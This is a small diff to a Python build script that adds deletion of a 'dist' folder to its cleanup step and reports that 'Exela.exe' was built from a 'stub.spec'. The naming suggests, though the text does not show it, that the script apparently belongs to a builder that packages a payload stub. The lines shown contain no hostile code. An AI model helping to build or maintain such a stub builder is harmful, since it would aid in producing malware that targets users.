@@ -35,9 +35,10 @@ def buildFile():
     try:
         shutil.rmtree("build")
         os.remove('stub.spec')
+        shutil.rmtree("dist")
     except:
         pass # sex
-  
+      
     os.system("cls")
     print("your file build succesfully\nYour file is => Exela.exe")
     
